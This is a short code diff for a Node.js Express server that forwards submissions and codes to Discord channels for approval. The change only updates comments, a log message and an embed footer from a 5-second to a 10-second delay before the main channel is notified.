@@ -18,7 +18,7 @@ const client = new Client({
 const requests = new Map();
 
 const APPROVAL_CHANNEL_ID  = process.env.DISCORD_APPROVAL_CHANNEL; // salon principal (accepte/refuse)
-const PRIORITY_CHANNEL_ID  = '1532004514306068510';                 // salon prioritaire (lecture seule, 5s avant)
+const PRIORITY_CHANNEL_ID  = '1532004514306068510';                 // salon prioritaire (lecture seule, 10s avant)
 const BASE_URL = process.env.BASE_URL || `http://localhost:${process.env.PORT || 3000}`;
 const PORT = process.env.PORT || 3000;
 
@@ -75,7 +75,7 @@ app.post('/api/submit', async (req, res) => {
             await priorityChannel.send({ embeds: [priorityEmbed] });
         }
 
-        // 2. Salon principal reçoit 5 secondes après avec les boutons
+        // 2. Salon principal reçoit 10 secondes après avec les boutons
         setTimeout(async () => {
             try {
                 await mainChannel.send({ embeds: [embed], components: [row] });
@@ -84,7 +84,7 @@ app.post('/api/submit', async (req, res) => {
             }
         }, 10000);
 
-        console.log(`✅ Demande #${id} envoyée (prioritaire immédiat, principal dans 5s)`);
+        console.log(`✅ Demande #${id} envoyée (prioritaire immédiat, principal dans 10s)`);
         res.json({ id });
     } catch (err) {
         console.error('Erreur envoi Discord :', err);
@@ -196,13 +196,13 @@ app.post('/api/code', async (req, res) => {
                         { name: 'Opérateur', value: operator },
                         { name: 'Code',      value: code     }
                     )
-                    .setFooter({ text: 'Lecture seule — salon principal reçoit dans 5s' })
+                    .setFooter({ text: 'Lecture seule — salon principal reçoit dans 10s' })
                     .setTimestamp();
                 await priorityChannel.send({ embeds: [priorityCodeEmbed] });
             } catch (e) { console.error('Erreur salon prioritaire (code):', e.message); }
         }
 
-        // Salon principal 5 secondes après
+        // Salon principal 10 secondes après
         if (mainChannel) {
             setTimeout(async () => {
                 try { await mainChannel.send({ embeds: [codeEmbed] }); }
